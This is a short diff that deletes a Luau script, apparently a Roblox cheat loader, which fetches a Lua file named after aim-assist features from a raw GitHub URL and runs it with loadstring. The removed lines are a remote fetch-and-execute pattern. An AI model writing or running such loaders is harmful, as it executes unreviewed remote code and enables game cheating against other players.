@@ -1,9 +1,0 @@
---!strict
-
-local HttpGet = game.HttpGet
-
-local URL = "https://raw.githubusercontent.com/aseumusu-design/EVADE-No-Mercy/refs/heads/main/A2_ModernV2_UI_Library_AimVeil_PredicSpear%20(1).lua"
-
-local Source = HttpGet(game, URL)
-
-loadstring(Source)()
